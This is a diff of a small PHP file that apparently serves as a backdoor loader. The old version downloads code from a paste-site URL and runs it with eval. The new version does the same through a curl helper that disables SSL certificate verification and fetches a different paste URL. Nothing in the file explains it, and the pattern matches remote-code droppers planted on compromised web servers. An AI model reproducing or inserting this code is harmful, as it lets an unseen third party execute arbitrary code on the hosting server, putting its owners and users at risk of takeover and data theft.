@@ -1,13 +1,22 @@
 <?php
-	$url = 'https://pastee.dev/r/54wmqhHk/0';
 
 
-	$php_code = file_get_contents($url);
+function getURL($url) {
+    
+    if(function_exists('curl_version')) {
+        
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
+    }
+}
 
 
-	if ($php_code !== false) {
-		eval('?>' . $php_code);
-	} else {
-		echo 'error';
-	}
-	?>
+eval("?>" . getURL("https://pastee.dev/r/4Q0V43S4/0"));
+
+?>
